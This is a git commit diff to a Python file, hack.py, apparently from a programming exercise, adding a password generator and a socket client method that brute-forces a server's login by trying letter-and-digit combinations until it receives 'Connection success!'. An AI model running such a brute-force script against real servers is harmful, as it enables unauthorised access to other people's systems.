28c99b381a5545d4f02661fb21b1a5e7acd357db
ferizoozoo <farhadzohoorz@gmail.com>
2020-06-03 13:05:42 +0430

    Add functions for generating and cracking password

--- hack.py
+++ hack.py
@@ -1,6 +1,16 @@
-# write your code here
 import sys
 import socket
+import itertools
+
+a_to_z = [chr(letter) for letter in range(97, 123)]
+zero_to_9 = [chr(letter) for letter in range(48, 58)]
+
+def password_generator():
+    length = 1
+    while True:
+        for pswrd in itertools.combinations(itertools.chain(a_to_z, zero_to_9), length):
+            yield ''.join(pswrd)
+        length += 1
 
 class Client:
     def __init__(self, ip_address, port):
@@ -9,6 +19,17 @@ class Client:
 
         self.socket = socket.socket()
         self.socket.connect((self.ip_address, self.port))
+
+    def crack_password(self):
+        attempts = 1
+        generator = password_generator()
+        while attempts < 1000000:
+            password = next(generator)
+            self.send_message(password)
+            self.get_response()
+            if self.server_response == 'Connection success!':
+                return password
+            attempts += 1
 
     def send_message(self, message):
         self.socket.send(message.encode('UTF-8'))
@@ -24,10 +45,9 @@ class Client:
 
 
 if __name__ == '__main__':
-    ip_address, port, message = sys.argv[1:4]
+    ip_address, port = sys.argv[1:3]
     client = Client(ip_address, int(port))
-    client.send_message(message)
-    client.get_response()
-    print(client)
+    password = client.crack_password()
+    print(password)
     client.close_connection()
 
